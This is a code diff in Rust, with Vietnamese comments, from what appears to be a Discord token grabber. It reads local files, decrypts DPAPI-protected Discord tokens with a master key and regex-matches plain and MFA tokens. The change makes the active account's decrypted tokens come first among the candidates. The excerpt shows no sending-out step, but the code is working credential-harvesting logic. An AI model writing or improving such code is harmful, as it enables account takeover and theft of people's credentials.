@@ -467,15 +467,15 @@ fn decrypt_discord_token(master_key: &[u8], encrypted_token_b64: &str) -> Option
     String::from_utf8(decrypted_bytes).ok()
 }
 
-fn extract_tokens_from_text(text: &str, master_key: Option<&[u8]>, candidates: &mut Vec<String>) {
+fn extract_tokens_from_text(text: &str, master_key: Option<&[u8]>, encrypted_tokens: &mut Vec<String>, plain_tokens: &mut Vec<String>) {
     // 1. Decrypt dQw4w9WgXcQ: encrypted tokens first
     if let Some(key) = master_key {
         if let Ok(re_enc) = Regex::new(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)") {
             for cap in re_enc.captures_iter(text) {
                 if let Some(enc_b64) = cap.get(1) {
                     if let Some(decrypted) = decrypt_discord_token(key, enc_b64.as_str()) {
-                        if !candidates.contains(&decrypted) {
-                            candidates.push(decrypted);
+                        if !encrypted_tokens.contains(&decrypted) {
+                            encrypted_tokens.push(decrypted);
                         }
                     }
                 }
@@ -495,14 +495,14 @@ fn extract_tokens_from_text(text: &str, master_key: Option<&[u8]>, candidates: &
 
     for mat in re_mfa.find_iter(text) {
         let token = mat.as_str().to_string();
-        if !candidates.contains(&token) {
-            candidates.push(token);
+        if !plain_tokens.contains(&token) {
+            plain_tokens.push(token);
         }
     }
     for mat in re_normal.find_iter(text) {
         let token = mat.as_str().to_string();
-        if !candidates.contains(&token) {
-            candidates.push(token);
+        if !plain_tokens.contains(&token) {
+            plain_tokens.push(token);
         }
     }
 }
@@ -525,10 +525,25 @@ fn scan_dir_for_tokens(dir: &Path, master_key: Option<&[u8]>, candidates: &mut V
         // Sắp xếp file theo thời gian chỉnh sửa giảm dần (file mới nhất xử lý trước)
         files.sort_by(|a, b| b.0.cmp(&a.0));
 
+        let mut encrypted_tokens = Vec::new();
+        let mut plain_tokens = Vec::new();
+
         for (_, path) in files {
             if let Ok(bytes) = std::fs::read(&path) {
                 let text = String::from_utf8_lossy(&bytes);
-                extract_tokens_from_text(&text, master_key, candidates);
+                extract_tokens_from_text(&text, master_key, &mut encrypted_tokens, &mut plain_tokens);
+            }
+        }
+
+        // Ưu tiên 100% token mã hóa DPAPI của tài khoản active hiện tại trước!
+        for t in encrypted_tokens {
+            if !candidates.contains(&t) {
+                candidates.push(t);
+            }
+        }
+        for t in plain_tokens {
+            if !candidates.contains(&t) {
+                candidates.push(t);
             }
         }
     }
